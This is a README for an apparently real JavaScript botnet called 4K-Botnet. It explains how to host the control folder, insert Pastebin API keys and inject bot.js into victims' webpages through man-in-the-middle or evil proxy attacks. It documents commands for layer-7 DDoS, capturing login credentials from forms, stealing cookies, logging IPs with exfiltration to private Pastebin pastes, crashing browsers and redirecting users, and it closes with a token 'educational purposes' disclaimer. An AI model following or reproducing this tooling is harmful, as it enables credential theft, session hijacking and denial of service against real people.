# 4K-Botnet
A simple and easy to use JS Botnet

# How to Setup
1) Clone repository
2) Upload the "Botnet" folder to your webserver
3) Edit "bot.js"
    + Change the "SERVER_URL" variable to your website's url
    + Change the "api_dev_key" varibable to match your pastebin's account key
    + Change the "api_user_key" variable to match your pastebin's account key
4) Done

# How to use
1) Edit the "cmds.txt" file - Each command on a seprate line
2) Inject "bot.js" into the victim's webpage

# Commands
You can put any JS code in the "cmds.txt" file and it will be executed [i.e. "alert('Hacked by Chowix40!')] or one of the following fuctions

## DDoS - UNTESTED
+ Usage - cmds.txt: DDoS(url)
+ DDoSes a website via layer 7

## getCreds
+ Usage - cmds.txt: getCreds()
+ Looks for any login forms and saves the entered login info
+ Login info will be saved to pastebin account as a private paste. Look for the [PW] marker

## getCookies
+ Usage - cmds.txt: getCookes()
+ Steals cookie information
+ Cookies will be saved to pastebin account as a private paste. Look for the [C] marker

## browserKill
+ Usage - cmds.txt: browserKill()
+ Effect Varies on device and browser
+ Same effect as crashsafari.com

## reDire
+ Usage - cmds.txt: reDire('example.com')
+ Redirects to another webpage
 
 ## ipLog
 + Usage - cmds.txt: ipLog()
 + Saves IP data to pastebin account as a private paste. Look for the [IP] marker

# TODO
+ Optimize Code
+ Add uids of some sort
+ Add more functions

# How to inject
+ MITM
+ Evil proxy server
+ Any other way to inject JS files

# DISCLAMER
+ This is for educational purposes ONLY
+ I or anyone else who works on this project can't and won't be held responsible for anything YOU do with this
+ Please use responsibly 
